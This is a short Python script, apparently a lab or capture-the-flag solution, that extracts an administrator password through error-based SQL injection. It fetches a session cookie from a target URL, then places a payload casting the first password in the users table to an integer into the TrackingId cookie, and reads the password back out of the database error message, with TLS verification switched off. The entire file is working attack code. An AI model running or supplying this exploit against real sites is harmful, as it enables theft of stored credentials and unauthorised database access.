import sys
import requests
import urllib3
import urllib
import re

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
#proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

def sqli_password(url,session):
    password_extracted = ""
    sql_payload = "'and 1 = CAST((SELECT password FROM users LIMIT 1)AS INT)--"
    sql_payload_url_encode = urllib.parse.quote(sql_payload)
    cookies = {'TrackingId' : sql_payload, 'session' : session}
    #r = requests.get(url, cookies = cookies, verify = False, proxies=proxies)
    r = requests.get(url, cookies = cookies, verify = False)
    html_response = r.text
    # print(r.status_code)
    x = re.findall(r'integer:\s*\"([^"]+)\"',html_response)
    print(x[0])
    

def get_cookie(url):
    r = requests.get(url)
    headers = r.headers['set-cookie']
    cookie_pairs = re.findall(r'(\w+)=(\w+)', headers)
    cookies = {}

    for key, value in cookie_pairs:
        cookies[key] = value

    trackingid = cookies.get('TrackingId')
    session = cookies.get('session')
    return session

def main():
    if len(sys.argv) != 2:
        print("(+) Usage: %s <url>" % sys.argv[0])
        print("(+) Example: python www.example.com")
    else:
        url = sys.argv[1]
        print("(+) Retrieving administrator password")
        session = get_cookie(url)
        sqli_password(url,session)

if __name__ =="__main__":
    main()
    
